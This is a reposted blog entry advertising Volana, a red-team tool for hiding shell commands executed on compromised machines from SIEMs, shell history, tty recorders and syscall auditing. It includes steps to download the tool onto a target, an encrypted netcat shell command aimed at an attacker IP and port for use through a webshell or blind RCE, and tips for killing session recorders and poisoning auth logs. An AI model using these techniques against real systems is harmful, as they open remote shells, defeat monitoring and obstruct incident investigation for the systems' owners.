---
title: "Volana - Shell Command Obfuscation To Avoid Detection Systems"
date: Wed, 19 Jun 2024 08:30:00 -0400
draft: false
type: posts
categories: 
- Exploitation,Infosec,Obfuscator,Pentest,Pentest Tool,Redteam,Shell Obfuscate,Volana
---
# Volana - Shell Command Obfuscation To Avoid Detection Systems

<br/>

<br/>
[![](https://blogger.googleusercontent.com/img/a/AVvXsEjwHywu1MIETxz4EH2PyiPK3380XzJ4D5Pwj4NR2FdQsjL_3SMMKX-5A78mReHbAjvUTK9DvzVK3ceDmge-ihPhaU7ur5A-5ylNRrDuEVRQKRM6D_xY67r8HslUuph9hiRL6tbYVhEERI063hVhsQr6FkEphP4PkjekNQUDFhCjiNmSaK08guKhfwfUxOrJ=s320)](https://blogger.googleusercontent.com/img/a/AVvXsEjwHywu1MIETxz4EH2PyiPK3380XzJ4D5Pwj4NR2FdQsjL_3SMMKX-5A78mReHbAjvUTK9DvzVK3ceDmge-ihPhaU7ur5A-5ylNRrDuEVRQKRM6D_xY67r8HslUuph9hiRL6tbYVhEERI063hVhsQr6FkEphP4PkjekNQUDFhCjiNmSaK08guKhfwfUxOrJ)

  

#### Shell command obfuscation to avoid SIEM/detection system

During pentest, an important aspect is to **be [stealth](https://www.kitploit.com/search/label/Stealth "stealth")**. For this reason you should **clear your tracks after your passage**. Nevertheless, many infrastructures log command and send them to a [SIEM](https://www.kitploit.com/search/label/Siem "SIEM") in a real time making the afterwards cleaning part alone useless.  
  
`volana` provide a simple way to hide commands executed on compromised machine by providing it self shell runtime (enter your command, volana executes for you). Like this you **clear your tracks DURING your passage**

Usage
-----

You need to get an interactive shell. (Find a way to spawn it, you are a hacker, it's your job ! [otherwise](https://github.com/ariary/volana#from-non-interactive-shell "otherwise")). Then download it on target machine and launch it. that's it, now you can type the command you want to be stealthy executed

```
## Download it from github release## If you do not have internet access from compromised machine, find another waycurl -lO -L https://github.com/ariary/volana/releases/latest/download/volana## Execute it./volana## You are now under the radarvolana » echo "Hi SIEM team! Do you find me?" > /dev/null 2>&1  #you are allowed to be a bit cockyvolana » [command]
```

Keyword for volana console: \* `ring`: enable ring mode ie each command is launched with plenty others to cover tracks (from solution that monitor system call) \* `exit`: exit volana console

### from non interactive shell

Imagine you have a non interactive shell (webshell or blind rce), you could use `[encrypt](https://www.kitploit.com/search/label/Encrypt "encrypt")` and `decrypt` subcommand. Previously, you need to build `volana` with embedded [](https://www.kitploit.com/search/label/Encryption "🌒 Shell command obfuscation to avoid detection systems (5)")[encrypt](https://www.kitploit.com/search/label/Encrypt "encrypt")ion key.

**On attacker machine**

```
## Build volana with encryption keymake build.volana-with-encryption## Transfer it on TARGET (the unique detectable command)## [...]## Encrypt the command you want to stealthy execute## (Here a nc bindshell to obtain a interactive shell)volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash">>> ENCRYPTED COMMAND
```

Copy encrypted command and executed it with your rce **on target machine**

```
./volana decr [encrypted_command]## Now you have a bindshell, spawn it to make it interactive and use volana usually to be stealth (./volana). + Don't forget to remove volana binary before leaving (cause decryption key can easily be retrieved from it)
```

**_Why not just hide command with `echo [command] | base64` ?_** And [decode](https://www.kitploit.com/search/label/Decode "decode") on target with `echo [encoded_command] | base64 -d | bash`

Because we want to be protected against systems that trigger alert for `base64` use or that seek base64 text in command. Also we want to make investigation difficult and base64 isn't a real brake.

Detection
---------

Keep in mind that `volana` is not a miracle that will make you totally invisible. Its aim is to make intrusion detection and investigation harder.

By detected we mean if we are able to trigger an alert if a certain command has been executed.

### Hide from

Only the `volana` launching command line will be catched. 🧠 **However, by adding a space** before executing it, the default bash behavior is to not save it

-   Detection systems that are based on history command output
-   Detection systems that are based on history files
-   `.bash_history`, ".zsh\_history" etc ..
-   Detection systems that are based on bash debug traps
-   Detection systems that are based on sudo built-in logging system
-   Detection systems tracing all processes syscall system-wide (eg `opensnoop`)
-   Terminal (tty) recorder (`script`, `screen -L`, [`sexonthebash`](https://github.com/ariary/sexonthebash "🌒 Shell command obfuscation to avoid detection systems (8)"), `ovh-ttyrec`, etc..)
-   Easy to detect & avoid: `pkill -9 script`
-   Not a common case
-   `screen` is a bit more difficult to avoid, however it does not register input (secret input: `stty -echo` => avoid)
-   Command detection Could be avoid with `volana` with encryption

### Visible for

-   Detection systems that have alert for unknown command (volana one)
-   Detection systems that are based on keylogger
-   Easy to avoid: copy/past commands
-   Not a common case
-   Detection systems that are based on syslog files (e.g. `/var/log/auth.log`)
-   Only for `sudo` or `su` commands
-   syslog file could be modified and thus be poisoned as you wish (e.g for _/var/log/auth.log_:`logger -p auth.info "No hacker is poisoning your syslog solution, don't worry"`)
-   Detection systems that are based on syscall (eg auditd,LKML/eBPF)
-   Difficult to analyze, could be make unreadable by making several diversion syscalls
-   Custom `LD_PRELOAD` injection to make log
-   Not a common case at all

Bug bounty
----------

Sorry for the clickbait title, but no money will be provided for contibutors. 🐛

Let me know if you have found: \* a way to detect `volana` \* a way to spy console that don't detect `volana` commands \* a way to avoid a detection system

[Report here](https://github.com/ariary/volana/issues/new/choose "Report here")

Credit
------

-   [8 ways to spy on console](https://github.com/annmuor/zn2021_8ways "8 ways to spy on console")
-   [moonwalk](https://github.com/mufeedvh/moonwalk "moonwalk"): similar tool that clear tracks AFTER passage

  
  

**[Download Volana](https://github.com/ariary/volana "Download Volana")**

[Source](http://www.kitploit.com/2024/06/volana-shell-command-obfuscation-to.html)
<br/>
---
